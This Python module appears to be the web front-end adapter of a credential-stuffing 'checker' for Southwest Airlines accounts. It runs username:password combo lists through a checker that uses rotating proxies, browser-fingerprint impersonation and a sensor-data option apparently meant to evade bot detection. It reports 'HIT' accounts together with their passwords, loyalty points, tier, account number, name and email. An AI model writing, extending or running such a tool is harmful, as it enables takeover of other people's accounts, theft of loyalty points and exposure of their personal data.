"""Web UI adapter for the Southwest checker worker."""

from __future__ import annotations

import json
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from southwest_checker.checker import CheckResult, SouthwestChecker, parse_combo
from southwest_checker.proxy import parse_proxy

_UNSET = object()
_thread_local = threading.local()


@dataclass
class JobSettings:
    full_bootstrap: bool = True
    auto_sensors: bool = False
    capture_data: dict[str, Any] | None = None
    impersonate: str = "safari17_2_ios"


_job_settings = JobSettings()
_settings_lock = threading.Lock()


def set_job_settings(
    *,
    full_bootstrap: bool = True,
    auto_sensors: bool = False,
    capture_data: dict[str, Any] | None = None,
) -> None:
    with _settings_lock:
        _job_settings.full_bootstrap = full_bootstrap
        _job_settings.auto_sensors = auto_sensors
        _job_settings.capture_data = capture_data


def get_job_settings() -> JobSettings:
    with _settings_lock:
        return JobSettings(
            full_bootstrap=_job_settings.full_bootstrap,
            auto_sensors=_job_settings.auto_sensors,
            capture_data=_job_settings.capture_data,
        )


def load_capture_config(path: Path) -> dict[str, Any] | None:
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return None


@dataclass
class WebCheckResult:
    status: str
    username: str
    password: str
    line: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    def format_line(self) -> str:
        return self.line

    def to_data(self) -> dict[str, Any]:
        return self.data


def _status_label(result: CheckResult) -> str:
    return {
        "hit": "HIT",
        "bad": "BAD",
        "retry": "RETRY",
        "error": "ERROR",
    }.get(result.status, "ERROR")


def _format_hit_line(username: str, password: str, result: CheckResult) -> str:
    name = " ".join(filter(None, [result.first_name, result.last_name]))
    points = result.redeemable_points if result.redeemable_points is not None else 0
    return (
        f"{username}:{password} | {points:,} pts | {result.tier or '?'} | "
        f"Acct: {result.account_number or '?'} | {name} | {result.email or '?'}"
    )


def _to_web_result(username: str, password: str, result: CheckResult) -> WebCheckResult:
    status = _status_label(result)
    if result.status == "hit":
        line = _format_hit_line(username, password, result)
    else:
        line = result.summary()

    data = {
        "username": username,
        "password": password,
        "status": status,
        "redeemable_points": result.redeemable_points,
        "tier": result.tier,
        "account_number": result.account_number,
        "first_name": result.first_name,
        "last_name": result.last_name,
        "email": result.email,
        "error": result.error,
    }
    return WebCheckResult(status=status, username=username, password=password, line=line, data=data)


def _get_thread_checker(proxy: str | None) -> SouthwestChecker:
    settings = get_job_settings()
    checker = getattr(_thread_local, "checker", None)
    checker_proxy = getattr(_thread_local, "proxy", None)
    if (
        checker is None
        or checker_proxy != proxy
        or checker.full_bootstrap != settings.full_bootstrap
        or checker.auto_sensors != settings.auto_sensors
    ):
        checker = SouthwestChecker(
            proxy=proxy,
            full_bootstrap=settings.full_bootstrap,
            auto_sensors=settings.auto_sensors,
            capture_data=settings.capture_data,
        )
        _thread_local.checker = checker
        _thread_local.proxy = proxy
    return checker


def parse_proxy_lines(lines: list[str]) -> tuple[list[str], list[str]]:
    valid: list[str] = []
    invalid: list[str] = []
    for line in lines:
        raw = line.strip()
        if not raw or raw.startswith("#"):
            continue
        try:
            valid.append(parse_proxy(raw))
        except ValueError:
            invalid.append(raw)
    return valid, invalid


def check_account(
    username: str,
    password: str,
    *,
    proxy: Any = _UNSET,
    timeout: int = 45,
) -> WebCheckResult:
    del timeout  # curl_cffi timeout is fixed in checker today
    proxy_url = None if proxy is _UNSET else proxy
    checker = _get_thread_checker(proxy_url)
    result = checker.check(username, password)
    return _to_web_result(username, password, result)
